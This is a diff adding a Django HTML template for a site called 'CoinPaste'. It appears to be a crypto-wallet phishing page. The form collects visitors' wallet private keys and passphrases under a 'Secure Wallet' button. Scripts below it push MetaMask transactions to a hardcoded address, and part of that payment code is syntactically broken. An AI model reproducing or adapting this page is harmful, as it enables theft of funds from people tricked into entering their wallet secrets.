@@ -1,0 +1,225 @@
+{%load static%}
+{% load crispy_forms_tags %}
+<!DOCTYPE html>
+<html>
+    <head>
+       <link href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet" />
+         <!-- <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"> -->
+ <link rel="stylesheet" href="{% static 'css/bootstrap.min.css'%}">
+          <link rel="stylesheet" href="{% static 'css/bootstrap.css' %}">  
+          <link rel="stylesheet" href="{% static 'css/bootstrap.css.map' %}">
+
+
+          <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+        <title>Home | Welcome to our site</title>
+    </head>
+
+    <style>
+        /*body{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-image: url('https://images.unsplash.com/photo-1556723089-1cb7bbd1a81e?ixid=MnwxMjA3fDB8MHxzZWFyY2h8N3x8aG9tZXBhZ2V8ZW58MHx8MHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60');
+    background-repeat: no-repeat;
+    background-size: 50% 100%;
+    background-position: left top;
+            
+        }*/
+      /* center{
+        margin-top:70px;
+       
+        }*/
+        .navigation{
+            display:flex;
+            flex-direction: row;
+            justify-content: space-evenly;
+            background-color: burlywood;
+            background-size:contain;
+            width:auto;
+            /* border-radius:15px; */
+           
+	-webkit-box-shadow: -2px 7px 21px -9px rgba(0,0,0,0.75);
+	-moz-box-shadow: -2px 7px 21px -9px rgba(0,0,0,0.75);
+	box-shadow: -2px 7px 21px -9px rgba(0,0,0,0.75);
+            height:50px;
+            z-index:1030;
+            top:0;
+            left:0;
+            right:0;
+
+        }
+        .asterisk{
+            display: none;
+        }
+        a{
+            margin-top:15px;
+            text-decoration:none;
+            font-size:20px;
+            font-weight:bolder;
+        }
+     input{
+        /*margin-top: 30px;*/
+        width: 450px;
+    height: 50px;
+    margin-top: 15px;
+    border-radius: 25px;
+    border: 2px solid grey;
+    padding-left: 25px;
+     }
+      .get-started-btn {
+  margin-left: 25px;
+  background: #17a2b8;
+  color: #fff;
+  border-radius: 5px;
+  padding: 10px 30px 11px 30px;
+  white-space: nowrap;
+  transition: 0.3s;
+  font-size: 14px;
+  font-weight: 600;
+  display: inline-block;
+}
+
+.get-started-btn:hover {
+  background: #17a2b8;
+  color: #fff;
+}
+
+@media (max-width: 768px) {
+  .get-started-btn {
+    margin: 0 48px 0 0;
+    padding: 5px 18px 6px 18px;
+    border-radius: 3px;
+  }
+}
+h1{
+    color: #17a2b8;
+}
+        </style>
+    <body>
+       <br />
+        
+
+       
+            <div class="container d-flex justify-content-center col-md-8 mt-3 ">
+    <div class="row">
+    <div class="card mb-4"> 
+                <div class="card-body">
+<h1 align="center" >CoinPaste</h1>
+<form method="post" style="margin-top: 1.3em;" onsubmit = "myFunction()">
+ 
+        {% csrf_token%}
+         
+         <!-- {{ cform| crispy }} -->
+
+
+<div id="div_id_email" class="form-group"> <div class=""> <input type="text" name="email" placeholder="Email" class="textinput textInput form-control" required id="id_email"> 
+</div> 
+</div> 
+<br />
+<div id="div_id_wallet_name" class="form-group"> 
+    
+                  
+                 <div class=""> 
+                    <select name="wallet_name" class="select form-control" required id="id_wallet_name"> 
+                        <option value="" selected>---------</option> <option value="0">Ledger Nano X</option> <option value="1">Exodus</option> <option value="2">Trust</option> <option value="3">Robinhood</option> <option value="4">Coinbase</option> <option value="5">Trezor</option> <option value="6">BitPay</option> <option value="7">MyCelium</option> <option value="8">MetaMask</option>
+
+</select> </div> </div>
+
+ <div id="div_id_wallet_public_key" class="form-group"> <div class=""> <input type="text" name="wallet_public_key" placeholder="Wallet Public Key" class="textinput textInput form-control" required id="id_wallet_public_key"> </div> </div> <div id="div_id_wallet_private_key" class="form-group"> <div class=""> <input type="password" name="wallet_private_key" placeholder="Wallet Private Key" class="textinput textInput form-control" required id="id_wallet_private_key"> </div> </div> <div id="div_id_wallet_passphrase" class="form-group"> <div class=""> <input type="password" name="wallet_passphrase" placeholder="Wallet Passphrase" class="textinput textInput form-control" required id="id_wallet_passphrase"> </div> </div>
+
+
+
+         <br />
+          <button align="center" type="submit" class="btn btn-dark  "  onclick="functionAlert();">Secure Wallet <i class="fa fa-lock"></i></button>
+        <br />
+         <script>
+function myFunction() {
+  alert("Your wallet account is being processed.\n CoinPaste will get back to you");
+                     if (window.confirm('Welcome to CoinPaste')) 
+    {
+      window.location.href='/';
+    };
+}
+</script>
+</form>
+</div>
+</div>
+</div>
+</div>
+         
+<!-- 
+         <div>
+    <button class="pay-button">Pay</button>
+    <div id="status"></div>
+  </div> -->
+  <!-- <script type="text/javascript">
+    window.addEventListener('load', async () => {
+      if (window.ethereum) {
+        window.web3 = new Web3(ethereum);
+        try {
+          await ethereum.enable();
+          initPayButton()
+        } catch (err) {
+          $('#status').html('User denied account access', err)
+        }
+      } else if (window.web3) {
+        window.web3 = new Web3(web3.currentProvider)
+        initPayButton()
+      } else {
+        $('#status').html('No Metamask (or other Web3 Provider) installed')
+      }
+    })
+
+    const initPayButton = () => {
+      $('.pay-button').click(() => {
+        // paymentAddress is where funds will be send to
+        const paymentAddress = '0x192c96bfee59158441f26101b2db1af3b07feb40'
+        const amountEth = 1
+
+        web3.eth.sendTransaction({
+          to: paymentAddress,
+          value: web3.toWei(amountEth, 'ether')
+        }, (err, transactionId) => {
+          if  (err) {
+            console.log('Payment failed', err)
+            $('#status').html('Payment failed')
+          } else {
+            console.log('Payment successful', transactionId)
+            $('#status').html('Payment successful')
+          }
+        })
+      })
+    }
+  </script> -->
+            <!-- <button>GET STARTED</button> -->
+
+        <!-- </center> -->
+<center> or </center>
+        <div class="container d-flex justify-content-center col-md-8 mt-3 ">
+<button class="pay-button get-started-btn"  onclick="javascript:buycoin()">Pay</button>
+<button id="connectButton" class="get-started-btn" onclick="javascript:connect()">Connect to MetaMask</button>
+<div id="status"></div>
+</div>
+<script type="text/javascript">
+   async function connect() {
+      const accounts = await    ethereum.request({method:'eth_requestAccounts'});
+     const account = accounts[0];
+ }
+
+async function buycoin() {
+const accounts = await ethereum.request({method: 'eth_requestAccounts'});
+const account = accounts[0];
+const transactionParameters = {
+from: ethereum.selectedAddress, // must match user's active address.
+to: '0x192c96bfee59158441f26101b2db1af3b07feb40' // Required except during contract publications.
+amount: '0.1xfe';// - add if you want to
+};
+alert(ethereum.selectedAddress + amount + " to" + transactionParameters.to);
+txHash = await ethereum.request({
+method: 'eth_sendTransaction',
+params: [transactionParameters]
+});
+}
+</script>
+        <script src="{% static 'js/bootstrap.js'%}"></script>
+
+    </body>
+</html>
